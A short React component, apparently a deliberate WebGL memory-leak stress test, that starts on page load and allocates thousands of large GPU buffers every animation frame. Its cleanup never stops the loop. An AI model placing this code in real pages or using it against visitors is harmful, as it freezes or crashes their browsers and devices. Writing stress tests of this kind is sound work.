"use client";

import { useEffect, useRef } from "react";

export default function WebGLLeakTest() {
  const canvasRef = useRef(null);

  useEffect(() => {
    const canvas = canvasRef.current;
    const gl = canvas.getContext("webgl");

    if (!gl) {
      console.error("WebGL not supported");
      return;
    }

    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const buffers = [];

    function stressGPU() {
      for (let i = 0; i < 1000; i++) {
        const buffer = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);

        const data = new Float32Array(1_000_000);

        for (let j = 0; j < data.length; j++) {
          data[j] = Math.random();
        }

        gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);

        buffers.push(buffer);
      }

      requestAnimationFrame(stressGPU);
    }

    stressGPU();

    return () => {
      // cleanup when component unmounts
      buffers.forEach((b) => gl.deleteBuffer(b));
    };
  }, []);

  return <canvas ref={canvasRef} />;
}